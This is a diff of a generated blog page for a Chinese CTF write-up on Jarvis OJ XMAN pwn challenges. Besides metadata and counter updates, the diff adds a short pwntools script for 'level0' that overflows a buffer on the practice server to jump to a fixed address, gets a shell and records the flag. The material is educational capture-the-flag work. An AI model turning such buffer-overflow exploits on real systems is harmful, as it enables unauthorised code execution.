@@ -79,21 +79,21 @@
 
 
 
-<meta name="description" content="留坑，有空把剩下的部分刷完">
+<meta name="description" content="有空再接着刷">
 <meta name="keywords" content="ctf,Jarvis OJ,writeup,pwn">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Jarvis OJ -- level1">
 <meta property="og:url" content="https://d001um3.github.io/2017/12/08/Jarvis_pwn_2/index.html">
 <meta property="og:site_name" content="D001UM3&#39;S BLOG">
-<meta property="og:description" content="留坑，有空把剩下的部分刷完">
+<meta property="og:description" content="有空再接着刷">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="http://oztni9daw.bkt.clouddn.com/a4226194ebc0669f987833bd12e091e4.png">
 <meta property="og:image" content="http://oztni9daw.bkt.clouddn.com/381467017eac75136dce866c641c3ae6.png">
 <meta property="og:image" content="http://oztni9daw.bkt.clouddn.com/4883e4b967ba0cdbb9a43b8afa024d55.png">
-<meta property="og:updated_time" content="2018-01-29T06:02:42.606Z">
+<meta property="og:updated_time" content="2018-02-03T03:38:38.789Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Jarvis OJ -- level1">
-<meta name="twitter:description" content="留坑，有空把剩下的部分刷完">
+<meta name="twitter:description" content="有空再接着刷">
 <meta name="twitter:image" content="http://oztni9daw.bkt.clouddn.com/a4226194ebc0669f987833bd12e091e4.png">
 
 
@@ -343,7 +343,7 @@
 
           
               <div class="post-description">
-                  留坑，有空把剩下的部分刷完
+                  有空再接着刷
               </div>
           
 
@@ -360,9 +360,8 @@
       
 
       
-        <blockquote>
-<p>中篇为Jarvis中的10道XMAN的题</p>
-</blockquote>
+        <p>#[XMAN]level0</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh = remote(&apos;pwn2.jarvisoj.com&apos;, 9881)</span><br><span class="line">sh.sendline(&apos;a&apos; * 0x88 + p64(0x400596))</span><br><span class="line">sh.interactive()</span><br><span class="line"># CTF&#123;713ca3944e92180e0ef03171981dcd41&#125;</span><br></pre></td></tr></table></figure>
 <h1 id="XMAN-level1"><a href="#XMAN-level1" class="headerlink" title="[XMAN]level1"></a>[XMAN]level1</h1><blockquote>
 <p>nc pwn2.jarvisoj.com 9877</p>
 </blockquote>
@@ -504,7 +503,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-count">15</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -515,7 +514,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-count">6</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
@@ -526,7 +525,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">16</span>
+                  <span class="site-state-item-count">18</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
